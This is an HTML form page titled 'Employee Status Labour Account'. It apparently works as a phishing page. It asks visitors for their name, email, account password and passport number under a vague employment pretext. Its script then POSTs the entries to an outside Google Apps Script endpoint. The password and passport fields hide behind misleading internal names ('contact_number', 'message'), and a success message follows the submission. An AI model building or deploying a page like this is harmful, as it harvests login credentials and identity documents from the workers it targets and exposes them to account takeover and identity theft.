<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form with Bootstrap</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js"></script>
    <style>
      .form-container {
        max-width: 500px;
        margin: auto;
        margin-top: 50px;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        background-color: #fff;
      }
    </style>
  
  
    <div class="container">
      <div class="form-container">
        <h4 class="text-center mb-4">Employee Status Labour Account </h4>
        <form id="submit-to-google-sheet">
          <div class="form-group">
            <label for="name">Name:</label>
            <input class="form-control" type="text" name="name" id="name" placeholder="Name" required="">
          </div>
          <div class="form-group">
            <label for="email">Email:</label>
            <input class="form-control" type="email" name="email" id="email" placeholder="Email" required="">
          </div>
          <div class="form-group">
            <label for="slip">Password:</label>
            <input class="form-control" type="password" name="contact_number" id="contact_number" placeholder="Password" required="">
          </div>

          <div class="form-group">
            <label for="loc">Gender:</label>
            <select class="form-control" name="gender" id="gender" required="">
              <option value="" disabled="" selected="" hidden="">Choose...</option>
              <option value="male">Male</option>
              <option value="female">Female</option>
            </select>
          </div>
          <div class="form-group">
            <label for="loc">Passport Number:</label>
            <textarea class="form-control" name="message" id="message" placeholder="Passport Number" required=""></textarea>
          <div class="form-group form-check mt-2">
            <input class="form-check-input" type="checkbox" id="age">
            <label class="form-check-label" for="age">Check if you are over 18 years old</label>
          </div>
          <div class="form-group form-check">
            <input class="form-check-input" type="checkbox" id="ex" required="">
            <label class="form-check-label" for="ex">By checking this box I certify that I am agree with the data
              terms and policies.
            </label>
          </div>
          <button type="submit" class="btn btn-primary btn-block">
            Submit
          </button>
        
      </div></form>
    </div>

    <script>
      const scriptURL =                       
      "https://script.google.com/macros/s/AKfycbyW2--EBI9aMnfZZgFlYlt7ln3fqG63UJMXN9ucMWlnWmCb-5FFtuZa_B9MJfNlU-ff/exec";
   const form = document.forms["submit-to-google-sheet"];
  form.addEventListener("submit", (e) => {
        e.preventDefault();
        var formData = new FormData(form);
        var ex = document.getElementById("ex").checked;
        var age = document.getElementById("age").checked;

        if (age) {
          formData.append("age", "Yes");
        } else {
          formData.append("age", "No");
        }
        if (ex) {
          formData.append("ex", "Yes");
        } else {
          formData.append("ex", "No");
        }

        fetch(scriptURL, { method: "POST", body: formData })
          .then((response) => {
            swal("Done", "Submitted Successfully.", "success");
          })
          .catch((error) => {
            swal("Error", "Something went wrong. please try again!", "error");
          });
      });
    </script>
  
</div>
